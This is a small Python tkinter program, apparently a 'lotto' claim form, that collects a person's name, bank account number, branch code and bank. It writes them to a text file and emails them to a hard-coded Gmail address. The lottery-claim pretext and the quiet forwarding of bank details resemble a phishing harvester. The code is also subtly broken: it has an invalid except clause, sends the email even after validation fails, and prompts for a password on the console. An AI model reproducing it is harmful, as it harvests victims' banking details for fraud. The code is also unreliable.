from tkinter import *
from tkinter.ttk import Combobox
from PIL import ImageTk, Image
from tkinter import messagebox
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


root = Tk()
root.title("Banking Details")
root.geometry("600x400")
load = Image.open("bann.jpg")
loader = ImageTk.PhotoImage(load)
img = Label(root, image=loader)
img.place(x=0, y=0)



class Banking:
    def __init__(self):
        # account labels
        self.account_name = Label(root, text="Account Holder:")
        self.account_name.place(x=10, y=100)
        self.account_number = Label(root, text="Account Number:")
        self.account_number.place(x=10, y=140)
        self.branch_fig = Label(root, text="Branch Code:")
        self.branch_fig.place(x=10, y=180)
        self.type_of_bank = Label(root, text="Choose Your Bank:")
        self.type_of_bank.place(x=10, y=220)

        # account entries
        self.account_name_entry = Entry(root, fg="black")
        self.account_name_entry.place(x=300, y=100)
        self.account_number_entry = Entry(root, fg="black")
        self.account_number_entry.place(x=300, y=140)
        self.branch_number_entry = Entry(root,  fg="black")
        self.branch_number_entry.place(x=300, y=180)

        # ComboBox
        self.bank_combobox = Combobox(root)
        self.bank_combobox["values"] = "ABSA", "Standard bank", "Capitec Bank", "FNB", "Nedbank", "Tyme bank"
        self.bank_combobox.place(x=300, y=220)
        self.bank_combobox.set("Choose Your Bank")
        self.bank_combobox['state'] = 'readonly'

        # buttons
        self.submit_button = Button(root, text="Submit Your Claim",  borderwidth="3", command=self.bank_account)
        self.submit_button.place(x=10, y=300)

        self.exit_button = Button(root, text="Exit",  borderwidth="3", command=self.exit)
        self.exit_button.place(x=280, y=300)

        self.clear_button = Button(root, text="Clear", borderwidth="3", command=self.clear)
        self.clear_button.place(x=180, y=300)

    # exit function

    def exit(self):
            return root.destroy()

    # clear function
    def clear(self):
            self.account_name_entry.delete(0, END)
            self.account_number_entry.delete(0, END)
            self.branch_number_entry.delete(0, END)

    def bank_account(self):
         try:
            self.bank_fig = self.account_number_entry.get()
            self.branch = self.branch_number_entry.get()
            if len(self.bank_fig) == 10 and len(self.branch) == 6:
                 self.details_file = open("Lotto_file.txt", "a+")
                 self.details_file.write(self.account_name_entry.get() + " " + self.account_number_entry.get() + " " + self.branch_number_entry.get() + " " + self.bank_combobox.get() + "\n")
                 self.details_file.close()
                 messagebox.showinfo("Successful", "Please Check Your Email For Further Instructions")
            else:
                messagebox.showinfo("Failed", "You are Kindly Advised to Please Enter A 10 Digit Bank Account Number and A 6 Digit Branch Code")
         except ValueError(str):
            messagebox.showinfo("Invalid", "You are kindly Advised to Please Utilize Digits Only")


         self.sender_email_id = 'siyanjomeni@gmail.com'
         self.receiver_email_id = ['siyanjomeni@gmail.com']
         self.password = input("Enter your password: ")
         self.subject = "Good day"
         self.msg = MIMEMultipart()
         self.msg['From'] = self.sender_email_id
         self.msg['To'] = ', ' .join(self.receiver_email_id)
         self.msg['Subject'] = self.subject
         self.body = "hey\n" + self.account_name_entry.get() + "\n" + self.account_number_entry.get() + "\n" + self.branch_number_entry.get()

         self.msg.attach(MIMEText(self.body, 'plain'))

         self.text = self.msg.as_string()
         self.s = smtplib.SMTP('smtp.gmail.com', 587)
        # start TLS for security
         self.s.starttls()
# Authentication

         self.s.login(self.sender_email_id, self.password)
# message to be sent

# sending the mail
         self.s.sendmail(self.sender_email_id, self.receiver_email_id, self.text)
# terminating the session
         self.s.quit()




app = Banking()
root.mainloop()
